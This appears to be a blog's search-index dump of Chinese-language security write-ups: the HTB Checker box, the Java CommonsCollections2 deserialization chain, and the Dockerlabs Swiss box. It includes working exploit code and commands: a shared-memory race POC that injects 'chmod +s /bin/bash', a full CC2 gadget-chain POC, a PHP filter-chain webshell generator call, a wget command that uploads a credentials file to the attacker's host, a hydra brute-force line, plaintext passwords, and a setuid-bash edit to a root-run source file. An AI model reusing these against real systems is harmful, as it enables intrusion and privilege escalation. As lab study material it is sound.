/backup/home_backup\n因此需要读取的文件路径就是：/backup/home_backup/home/reader/.google_authenticator\n到下面这个网站去生成验证码\nOnline one-time password generator / TOTP (Google Authenticator) Online / 2FA 大概率是时区的问题？因为每个验证码都是有时效的，大概也就几十秒。我把VPN调到了US节点就能正常登录了。\nRoot #\r查看特殊权限命令\nreader@checker:~$ sudo -l\rMatching Defaults entries for reader on checker:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser reader may run the following commands on checker:\r(ALL) NOPASSWD: /opt/hash-checker/check-leak.sh * 查看一下这个脚本的具体内容\nreader@checker:~$ cat /opt/hash-checker/check-leak.sh\r#!/bin/bash\rsource `dirname $0`/.env\rUSER_NAME=$(/usr/bin/echo \u0026#34;$1\u0026#34; | /usr/bin/tr -dc \u0026#39;[:alnum:]\u0026#39;)\r/opt/hash-checker/check_leak \u0026#34;$USER_NAME\u0026#34; 其中的**/opt/hash-checker/check_leak**是一个二进制文件，无法直接查看源码\n不过可以使用IDA进行反编译\nIDA #\rint __cdecl main(int argc, const char **argv, const char **envp)\r{\rconst char *v3; // rdx\runsigned int v5; // [rsp+14h] [rbp-3Ch]\rchar *v6; // [rsp+18h] [rbp-38h]\rchar *v7; // [rsp+20h] [rbp-30h]\rchar *v8; // [rsp+28h] [rbp-28h]\rchar *v9; // [rsp+30h] [rbp-20h]\rchar *s; // [rsp+40h] [rbp-10h]\rvoid *ptr; // [rsp+48h] [rbp-8h]\rv6 = getenv(\u0026#34;DB_HOST\u0026#34;);\rv7 = getenv(\u0026#34;DB_USER\u0026#34;);\rv8 = getenv(\u0026#34;DB_PASSWORD\u0026#34;);\rv9 = getenv(\u0026#34;DB_NAME\u0026#34;);\rif ( *(_BYTE *)(((unsigned __int64)(argv + 1) \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(argv + 1);\rs = (char *)argv[1];\rif ( !v6 || !v7 || !v8 || !v9 )\r{\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: Missing database credentials in environment\\n\u0026#34;, 1uLL, 0x33uLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rif ( argc != 2 )\r{\rif ( *(_BYTE *)(((unsigned __int64)argv \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(argv);\rv3 = *argv;\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfprintf(stderr, \u0026#34;Usage: %s \u0026lt;USER\u0026gt;\\n\u0026#34;, v3);\r__asan_handle_no_return();\rexit(1);\r}\rif ( !s )\rgoto LABEL_40;\rif ( *(_BYTE *)(((unsigned __int64)s \u0026gt;\u0026gt; 3) + 0x7FFF8000) != 0\r\u0026amp;\u0026amp; ((unsigned __int8)s \u0026amp; 7) \u0026gt;= *(_BYTE *)(((unsigned __int64)s \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r{\r__asan_report_load1(s);\r}\rif ( !*s )\r{\rLABEL_40:\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: \u0026lt;USER\u0026gt; is not provided.\\n\u0026#34;, 1uLL, 0x1FuLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rif ( strlen(s) \u0026gt; 0x14 )\r{\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;stderr \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;stderr);\rfwrite(\u0026#34;Error: \u0026lt;USER\u0026gt; is too long. Maximum length is 20 characters.\\n\u0026#34;, 1uLL, 0x3CuLL, stderr);\r__asan_handle_no_return();\rexit(1);\r}\rptr = (void *)fetch_hash_from_db(v6, v7, v8, v9, s);\rif ( ptr )\r{\rif ( (unsigned __int8)check_bcrypt_in_file(\u0026#34;/opt/hash-checker/leaked_hashes.txt\u0026#34;, ptr) )\r{\rputs(\u0026#34;Password is leaked!\u0026#34;);\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;edata \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;edata);\rfflush(edata);\rv5 = write_to_shm(ptr);\rprintf(\u0026#34;Using the shared memory 0x%X as temp location\\n\u0026#34;, v5);\rif ( *(_BYTE *)(((unsigned __int64)\u0026amp;edata \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_load8(\u0026amp;edata);\rfflush(edata);\rsleep(1u);\rnotify_user(v6, v7, v8, v9, v5);\rclear_shared_memory(v5);\r}\relse\r{\rputs(\u0026#34;User is safe.\u0026#34;);\r}\rfree(ptr);\r}\relse\r{\rputs(\u0026#34;User not found in the database.\u0026#34;);\r}\rreturn 0;\r} 由于我们不知道env里面有什么，这个目录下的**.env还是需要使用filterchains**来读（有时候会失灵，不知道为什么？？？\n得到数据库用户以及密码\nbookstack:pK8HK7IHCKLCNHUJ7 登录后查看user表，发现有三个用户\n因此可以使用bob来绕过数据库中用户的检测\n值得注意的点是，这里将哈希值写入共享内存，并通知用户。然后清除共享内存。\n其中有一个sleep的函数调用，意味着其中有一秒空隙，哈希值是存在于共享内存中的。其中的write_to_shm函数中有关于共享内存的逻辑部分。\nwrite_to_shm #\r如何获取到这个共享内存地址呢？跟进write_to_shm函数\n__int64 __fastcall write_to_shm(const char *a1)\r{\runsigned __int64 v1; // rbx\r__int64 v2; // rax\runsigned __int64 v3; // r12\runsigned int v4; // eax\rtime_t v5; // rax\runsigned __int64 v6; // rcx\runsigned int key; // [rsp+10h] [rbp-A0h]\rint shmid; // [rsp+14h] [rbp-9Ch]\rchar *v10; // [rsp+20h] [rbp-90h]\rconst char *s; // [rsp+28h] [rbp-88h]\rchar v12[88]; // [rsp+30h] [rbp-80h] BYREF\runsigned __int64 v13; // [rsp+88h] [rbp-28h]\rv1 = (unsigned __int64)v12;\rif ( _asan_option_detect_stack_use_after_return )\r{\rv2 = __asan_stack_malloc_0(64LL);\rif ( v2 )\rv1 = v2;\r}\r*(_QWORD *)v1 = 1102416563LL;\r*(_QWORD *)(v1 + 8) = \u0026#34;1 32 8 7 now:105\u0026#34;;\r*(_QWORD *)(v1 + 16) = write_to_shm;\rv3 = v1 \u0026gt;\u0026gt; 3;\r*(_DWORD *)(v3 + 2147450880) = -235802127;\r*(_DWORD *)(v3 + 2147450884) = -202116352;\rv13 = __readfsqword(0x28u);\rv4 = time(0LL);\rsrand(v4);\rkey = rand() % 0xFFFFF;\rshmid = shmget(key, 0x400uLL, 950);\rif ( shmid == -1 )\r{\rperror(\u0026#34;shmget\u0026#34;);\r__asan_handle_no_return();\rexit(1);\r}\rv10 = (char *)shmat(shmid, 0LL, 0);\rif ( v10 == (char *)-1LL )\r{\rperror(\u0026#34;shmat\u0026#34;);\r__asan_handle_no_return();\rexit(1);\r}\rv5 = time(0LL);\rif ( *(_BYTE *)(((v1 + 32) \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\rv5 = __asan_report_store8(v1 + 32);\r*(_QWORD *)(v1 + 32) = v5;\rs = ctime((const time_t *)(v1 + 32));\rv6 = (unsigned __int64)\u0026amp;s[strlen(s) - 1];\rif ( *(_BYTE *)((v6 \u0026gt;\u0026gt; 3) + 0x7FFF8000) != 0 \u0026amp;\u0026amp; (char)(v6 \u0026amp; 7) \u0026gt;= *(_BYTE *)((v6 \u0026gt;\u0026gt; 3) + 0x7FFF8000) )\r__asan_report_store1(v6);\r*(_BYTE *)v6 = 0;\rsnprintf(v10, 0x400uLL, \u0026#34;Leaked hash detected at %s \u0026gt; %s\\n\u0026#34;, s, a1);\rshmdt(v10);\rif ( v12 == (char *)v1 )\r{\r*(_QWORD *)((v1 \u0026gt;\u0026gt; 3) + 0x7FFF8000) = 0LL;\r}\relse\r{\r*(_QWORD *)v1 = 1172321806LL;\r*(_QWORD *)((v1 \u0026gt;\u0026gt; 3) + 0x7FFF8000) = 0xF5F5F5F5F5F5F5F5LL;\r**(_BYTE **)(v1 + 56) = 0;\r}\rreturn key;\r} 注意到这里👇，使用当前时间生成随机数作为共享内存的键，尝试获取共享内存段。shmget 的权限设置为 950。\nv4 = time(0LL);\rsrand(v4);\rkey = rand() % 0xFFFFF;\rshmid = shmget(key, 0x400uLL, 950); 那么说，如果我们的脚本用当前时间做随机数，也可以获取到这个内存的地址咯。\nnotify_user #\r发现在这个函数中，存在着命令执行的语句。\nv16变量用于存储使用 snprintf 计算出的格式化字符串的长度。\n再次调用 snprintf，将格式化后的 MySQL 查询存储在 command 中。这次会实际写入字符串。\n最后再popen执行命令\n这里的mysql语句是直接拼接的，可以使用引号逃逸掉，在后面拼接命令\n因此如果能够控制这个command的内容，就可以写入命令\n其中v20间接和v5有关，也就是和当前时间戳的随机数有关\n因此总的思路就有了\n先通过 v5 = write_to_shm(ptr); 获取到共享内存地址\r再写入 v20 变量进行命令执行\r最后不停修改共享内存，导致目标脚本读取到修改后的命令 这里要注意几个点\n第一个点，共享内存中必须要有Leaked hash detected这个字符串\n否则就会像这样无法执行😭👇\n第二个点，字符串中必须要有大于符号（ASCII码为62）\n否则会报这个错😭👇\nPOC #\r这是我用AI跑的👇\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;sys/ipc.h\u0026gt;\r#include \u0026lt;sys/shm.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\rint main() {\runsigned int v4 = (unsigned int)time(NULL);\rsrand(v4);\r// 生成随机键\rkey_t key = rand() % 0xFFFFF;\r// 获取共享内存段的标识符\rint shmid = shmget(key, 0x400, IPC_CREAT | 0666);\rif (shmid \u0026lt; 0) {\rperror(\u0026#34;shmget failed\u0026#34;);\rreturn 1;\r}\r// 附加共享内存\rchar *share_memory = (char *)shmat(shmid, NULL, 0);\rif (share_memory == (char *)-1) {\rperror(\u0026#34;shmat failed\u0026#34;);\rreturn 1;\r}\r// 修改共享内存中的内容，必须要有前面的Leaked到\u0026gt;部分\rconst char *message = \u0026#34;Leaked hash detected \u0026gt; \u0026#39;; chmod +s /bin/bash;#\u0026#34;;\rsnprintf(share_memory,0x400,\u0026#34;%s\u0026#34;, message ); // 将消息复制到共享内存\r// 读取并打印共享内存中的内容\rprintf(\u0026#34;Message in shared memory: %s\\n\u0026#34;, share_memory);\r// 分离共享内存\rif (shmdt(share_memory) == -1) {\rperror(\u0026#34;shmdt failed\u0026#34;);\rreturn 1;\r}\rreturn 0;\r} 使用gcc编译好，然后传到靶机上\ngcc -o test test.c 然后持续执行\nwhile true; do ./test; done 最后sudo执行那个检查命令，得到的正确回显应该是mysql报错，但是不影响后面提权的部分\nSummary #\r这是一道很有质量的题目！不仅有Web，还包含了逆向的部分。\nUser：Teampass的**SQL注入漏洞拿到密码哈希值，破解后获取到reader的ssh密码，但是需要验证码。登录到了Bookstack**，通过SSRF漏洞读取密钥值，生成验证码后进行SSH登录。（可能需要切换节点\nRoot：IDA反编译check-leak脚本，发现存在条件竞争漏洞，共享内存在一秒钟的时间内是可以写状态，之后内存中的命令会被带到命令行中拼接为mysql查询命令，这里可以直接引号闭合拼接命令。要注意的是脚本对内存中的字符串内容有检查，否则到不了mysql那一步。\n","date":"2025-02-27","externalUrl":null,"permalink":"/posts/2025/02/htb-checker/","section":"Posts","summary":"","title":"HTB-Checker","type":"posts"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/tags/commoncollections/","section":"Tags","summary":"","title":"Commoncollections","type":"tags"},{"content":"\rEnvironment #\rPom.xml\n\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.apache.commons\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;commons-collections4\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;4.0\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt;\r\u0026lt;dependency\u0026gt;\r\u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt;\r\u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt;\r\u0026lt;version\u0026gt;3.22.0-GA\u0026lt;/version\u0026gt;\r\u0026lt;/dependency\u0026gt; TemplatesImpI #\r这个类用于加载恶意类，当声明一个实例的时候会触发getTransletInstance方法\n查看getTransletInstance中**_name**变量为空则直接返回\n当**_class变量设置为了null**，那么会进入**defineTransletClasses()**方法\n分析**defineTransletClasses()**方法，这里有一个父类的判断\n跟进查看ABSTRACT_TRANSLET变量可以知道，他是一个静态常量\n因此只需要构造一个恶意类然后继承他，在进行equal判断的时候，他的父类就是ABSTRACT_TRANSLET的值，随后将**_transletIndex**设置为0后退出\n如下构造一个恶意类，需要添加一个psvm然后运行一下，便会在**/output目录下得到evil.class**，注意不能是引用evil.java！\nimport com.sun.org.apache.xalan.internal.xsltc.DOM;\rimport com.sun.org.apache.xalan.internal.xsltc.TransletException;\rimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\rimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;\rimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;\rpublic class evil extends AbstractTranslet {\rstatic {\rtry{\rRuntime.getRuntime().exec(\u0026#34;calc\u0026#34;);\r}catch (Exception e){\re.printStackTrace();\r}\r}\rpublic static void main(String[] args) {\r}\r@Override\rpublic void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\r}\r@Override\rpublic void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\r}\r} 由于**_name**、_bytecodes都是私有变量，只能通过反射的方式给其设置\n注意readObject方法中的**_tfactory**变量同样需要设置 ，否则会报出空指针异常\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\rimport org.junit.Test;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // 设置_name变量不为空 _class无需设置，需要进入defineTransletClasses\r//下面读取恶意类的字节码\rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //需要将字节码转为二维数组，符合形参\rbytecodes_field.set(templates,bytes1);\r}\r} 调试可以看到，字节码的还原让class[0]变成了evil类\n然后跳出循环来到getTransletInstance方法，可以看到这里针对evil类进行了实例化，因此触发了恶意构造方法。\nTransformingComparator #\r这个类使用了Serializable接口，可以被序列化\n其中一个参数是transformer，并且在触发compare方法的时候，对这个参数调用了transform方法\n如果transformer的值为InvokerTransformer，那么他的调用方式就和CC1链一样\nPriorityQueue #\r接下来就是要触发他的compare方法，这个类同样继承了序列化接口\n查看heapify方法\n跟进siftDown方法\n再跟进\n在siftDownUsingComparator方法中看到了需要的compare方法\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport org.apache.commons.collections4.comparators.TransformingComparator;\rimport org.apache.commons.collections4.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.PriorityQueue;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // 设置_name变量不为空 _class无需设置，需要进入defineTransletClasses\r//下面读取恶意类的字节码\rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //需要将字节码转为二维数组，符合形参\rbytecodes_field.set(templates,bytes1);\r//反射调用newTransformer\rInvokerTransformer transformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{});\rTransformingComparator comparator = new TransformingComparator(transformer);\rPriorityQueue queue = new PriorityQueue(comparator);\rqueue.add(templates);\rqueue.add(2);\rserialize(queue);\rdeserialize();\r}\rpublic static void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic static Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} 这里会报错说找不到这个方法\n跟进PriorityQueue.add.offer.siftUp.siftUpUsingComparator\n发现在添加队列的时候，就会触发compare方法，而提前传进入的InvokerTransform会在传入的整数上调用newTransformer，但是找不到，因此会被提前执行。\n所以仍然需要使用反射来进行设置\nPOC #\rimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\rimport org.apache.commons.collections4.comparators.TransformingComparator;\rimport org.apache.commons.collections4.functors.ConstantTransformer;\rimport org.apache.commons.collections4.functors.InvokerTransformer;\rimport org.junit.Test;\rimport java.io.ObjectInputStream;\rimport java.io.ObjectOutputStream;\rimport java.lang.reflect.Field;\rimport java.nio.file.Files;\rimport java.nio.file.Paths;\rimport java.util.PriorityQueue;\rpublic class CC2TEST {\r@Test\rpublic void test() throws Exception {\rTemplatesImpl templates = new TemplatesImpl();\rClass\u0026lt;? extends TemplatesImpl\u0026gt; aClass = templates.getClass();\rField name_field = aClass.getDeclaredField(\u0026#34;_name\u0026#34;);\rname_field.setAccessible(true);\rname_field.set(templates,\u0026#34;name\u0026#34;); // 设置_name变量不为空 _class无需设置，需要进入defineTransletClasses\r//下面读取恶意类的字节码\rField bytecodes_field = aClass.getDeclaredField(\u0026#34;_bytecodes\u0026#34;);\rbytecodes_field.setAccessible(true);\rbyte[] bytes = Files.readAllBytes(Paths.get(\u0026#34;E:\\\\CC1\\\\test\\\\target\\\\test-classes\\\\evil.class\u0026#34;));\rbyte[][] bytes1 ={bytes}; //需要将字节码转为二维数组，符合形参\rbytecodes_field.set(templates,bytes1);\r//反射调用newTransformer\rInvokerTransformer invokerTransformer = new InvokerTransformer\u0026lt;\u0026gt;(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{});\r//先将transformer赋值\rTransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));\rPriorityQueue queue = new PriorityQueue(transformingComparator);\r//添加恶意类\rqueue.add(templates);\rqueue.add(1);\r//通过反射修改TransformingComparator的transformer\rField transformer1 = transformingComparator.getClass().getDeclaredField(\u0026#34;transformer\u0026#34;);\rtransformer1.setAccessible(true);\rtransformer1.set(transformingComparator,invokerTransformer);\rserialize(queue);\rdeserialize();\r}\rpublic static void serialize(Object o) throws Exception {\rtry (ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\roos.writeObject(o);\r}\r}\rpublic static Object deserialize() throws Exception {\rtry (ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(\u0026#34;ser.ser\u0026#34;)))) {\rreturn ois.readObject();\r}\r}\r} 参考文章\nCommonsCollections2分析-CSDN博客\nJava\u0026ndash;cc2链反序列化漏洞\u0026amp;超级清晰详细 - Erichas - 博客园\n","date":"2025-02-26","externalUrl":null,"permalink":"/posts/2025/02/commoncollections-2/","section":"Posts","summary":"","title":"CommonCollections-2","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/swiss ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 19:53 CST\rNmap scan report for realgob.dl (172.17.0.2)\rHost is up (0.00026s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: |_ 256 f1:2d:b0:54:e3:57:94:c8:3a:1a:7a:ba:d8:2d:7e:f9 (ECDSA)\r80/tcp open tcpwrapped\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: \\xF0\\x9F\\x91\\x8B Mario \\xC3\\x81lvarez Fer\\xC5\\x84andez\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\rTCP/IP fingerprint:\rOS:SCAN(V=7.94SVN%E=4%D=2/25%OT=22%CT=1%CU=40368%PV=Y%DS=1%DC=D%G=Y%M=0242A\rOS:C%TM=67BDAF4F%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%I\rOS:I=I%TS=A)SEQ(SP=107%GCD=2%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7\rOS:%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST1\rOS:1)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%\rOS:W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=\rOS:Y%DF=N%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T2(R=Y%DF=N%T=40%W=0%S=O%A=Z%F=R%\rOS:O=%RD=0%Q=)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=\rOS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%\rOS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I\rOS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.25 ms realgob.dl (172.17.0.2)\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 17.18 seconds ffuf #\r扫描得到一个file参数可以进行读取文件\n查看到存在darks用户\n这里依旧可以使用filterchains攻击\nsynacktiv/php_filter_chain_generator [root@kali] /home/kali/swiss/php_filter_chain_generator (main) ❯ python php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?php system($_POST[\u0026#34;cmd\u0026#34;]);?\u0026gt;\u0026#39; 在该目录下发现了一个很大的txt文件\n由于太大无法查看，这里我把文件传到了kali\ncmd=wget --method=PUT --body-file=credentials.txt http://172.17.0.1:1000 kali\n❯ nc -lvnp 1000 \u0026gt; get.txt 使用strings读取然后grep过滤查找（因为有一部分二进制码，使用cat过滤给grep会报错\n得到密码：_dkvndsqwcdfef34445\nHydra #\r另一种获取密码的方式就是暴力破解网站里的登录口\n[root@kali] /home/kali/swiss ❯ hydra -l administrator -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form \u0026#39;/sobre-mi/login.php:username=^USER^\u0026amp;password=^PASS^:F=Usuario o contraseña incorrectos.\u0026#39; -f -t 64 -I User #\r直接使用ssh登录是不可以的\n在上级目录看到一个文件，同样将其转出来\n查看可见字符发现一个IP地址：172.17.0.188\n似乎是他会向172.17.0.188发送一些东西？然后发送失败了？，为了能够抓到包，需要添加网络接口\n[root@kali] ~kali/swiss ❯ ip addres add 172.17.0.188/24 dev docker0 然后就能ssh登录了，但是不能使用cd命令？\n可以参考一下具体的ip\nCristal #\r执行sendinv2文件\n使用wireshark进行抓包发现一个BASE32加密后字符串\n将里面的加密字段解密一下\nhola! somos el grupo BlackCat, pensamos en encriptar este server pero no tiene nada de interes, te ahorrare tiempo: cristal:dropchostop453SJF : disfruta 得到了cristal的密码\nRoot #\r上传linpeas，注意到root在运行system.sh\ncristal@f47e170acca0:~$ cat systm.sh #!/bin/bash\rvar1=\u0026#34;/home/cristal/systm.c\u0026#34;\rvar2=\u0026#34;/home/cristal/syst\u0026#34;\rwhile true; do\rgcc -o $var2 $var1\r$var2\rsleep 15\rdone\rcristal@f47e170acca0:~$ ls -al\rtotal 64\rdrwxr-x--- 1 cristal cristal 4096 Feb 25 08:51 .\rdrwxr-xr-x 1 root root 4096 Nov 11 12:07 ..\r-rw------- 1 cristal cristal 0 Nov 11 12:20 .bash_history\r-rw-r--r-- 1 cristal cristal 220 Nov 11 12:07 .bash_logout\r-rw-r--r-- 1 cristal cristal 3771 Nov 11 12:07 .bashrc\rdrwx------ 2 cristal cristal 4096 Feb 25 08:48 .cache\rdrwx------ 3 cristal cristal 4096 Feb 25 08:49 .gnupg\rdrwxrwxr-x 3 cristal cristal 4096 Nov 11 12:13 .local\r-rw-r--r-- 1 cristal cristal 807 Nov 11 12:07 .profile\r-rwxr-xr-x 1 root root 16416 Feb 25 08:51 syst\r-rw-rw-r-- 1 root editor 1516 Nov 11 12:13 systm.c\r-rwxr-xr-x 1 root root 141 Nov 11 20:33 systm.sh 当前用户对systm.c具有可写权限\n只需要修改一下就行了\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;string.h\u0026gt;\r#include \u0026lt;unistd.h\u0026gt;\r#include \u0026lt;sys/utsname.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\rvoid log_system_info(const char *filename) {\rFILE *log_file = fopen(filename, \u0026#34;a\u0026#34;);\rif (log_file == NULL) {\rperror(\u0026#34;Error al abrir el archivo de log\u0026#34;);\rexit(EXIT_FAILURE);\r}\r// Información del sistema\rstruct utsname sys_info;\rif (uname(\u0026amp;sys_info) \u0026lt; 0) {\rperror(\u0026#34;Error al obtener información del sistema\u0026#34;);\rexit(EXIT_FAILURE);\r}\r// Tiempo de inicio del sistema\rstruct timespec uptime;\rif (clock_gettime(CLOCK_BOOTTIME, \u0026amp;uptime) \u0026lt; 0) {\rperror(\u0026#34;Error al obtener el tiempo de inicio del sistema\u0026#34;);\rexit(EXIT_FAILURE);\r}\rtime_t boot_time = time(NULL) - uptime.tv_sec;\r// Escribir la información en el archivo de log\rfprintf(log_file, \u0026#34;-----------------------------\\n\u0026#34;);\rfprintf(log_file, \u0026#34;Fecha y Hora: %s\u0026#34;, ctime(\u0026amp;boot_time));\rfprintf(log_file, \u0026#34;Nombre del Sistema: %s\\n\u0026#34;, sys_info.sysname);\rfprintf(log_file, \u0026#34;Nombre del Host: %s\\n\u0026#34;, sys_info.nodename);\rfprintf(log_file, \u0026#34;Versión del Sistema: %s\\n\u0026#34;, sys_info.release);\rfprintf(log_file, \u0026#34;Versión del Kernel: %s\\n\u0026#34;, sys_info.version);\rfprintf(log_file, \u0026#34;Arquitectura de Hardware: %s\\n\u0026#34;, sys_info.machine);\rfprintf(log_file, \u0026#34;-----------------------------\\n\u0026#34;);\rfclose(log_file);\r}\rint main() {\rconst char *log_filename = \u0026#34;/tmp/registros.log\u0026#34;;\rsystem(\u0026#34;chmod u+s /bin/bash\u0026#34;);\rlog_system_info(log_filename);\rreturn 0;\r} Summary #\rUser：在页面上使用filterchains虽然成功了，但是还是无法直接反弹shell，通过目录里的文件得知darks的密码，并且需要给自己添加一个172.17.0.188的网络接口才能成功连接。使用wireshark抓包得到加密字符串，获得cristal的密码。（也可以通过hydra爆破得到darks的密码，可能并不是预期？\nRoot：当前用户对systm.c具有可写权限，由于没有vim，这里使用的是nano，头文件中包含过stdlib.h，因此可以在主函数中直接使用system函数进行命令执行，给**/bin/bash**添加执行者权限。\n","date":"2025-02-26","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-swiss/","section":"Posts","summary":"","title":"Dockerlabs-Swiss","type":"posts"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/tags/java/","section":"Tags","summary":"","title":"Java","type":"tags"},{"content":"","date":"2025-02-26","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"Web","type":"categories"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali ❯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 16:15 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 